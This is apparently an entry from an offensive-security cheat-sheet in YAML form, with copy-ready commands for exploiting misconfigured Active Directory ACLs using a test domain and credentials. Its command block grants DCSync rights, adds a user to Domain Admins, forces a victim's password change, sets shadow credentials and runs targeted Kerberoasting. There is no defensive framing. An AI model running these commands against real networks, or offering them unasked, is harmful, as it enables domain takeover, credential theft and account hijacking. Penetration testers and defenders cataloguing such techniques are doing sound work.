---
description: |
  Exploit misconfigured AD ACLs using Impacket tools. Add users
  to groups, reset passwords, or grant DCSync rights.

  Reference values:
    Target DC: 10.10.10.1
    Domain: test.local
    Username: john
    Password: password123
command: |
  # Grant DCSync rights (WriteDACL on domain)
  impacket-dacledit -action write -rights DCSync -principal john -target-dn "DC=test,DC=local" test.local/john:password123

  # Add user to group (GenericAll/GenericWrite on group)
  net rpc group addmem "Domain Admins" john -U test.local/john%password123 -S 10.10.10.1

  # Force change password (ForceChangePassword)
  net rpc password victim -U test.local/john%password123 -S 10.10.10.1

  # Shadow Credentials (GenericAll/GenericWrite on user)
  certipy shadow auto -u john@test.local -p 'password123' -account victim

  # Targeted Kerberoasting (GenericAll/GenericWrite — set SPN)
  python3 targetedKerberoast.py -u john -p password123 -d test.local --dc-ip 10.10.10.1
phase:
  - Exploitation
  - Post-Exploitation
target_os:
  - Windows
services:
  - LDAP
items:
  - Username
  - Password
techniques:
  - ACL_Abuse
  - Shadow_Credentials
  - DCSync
network_position:
  - Internal
references:
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html
---
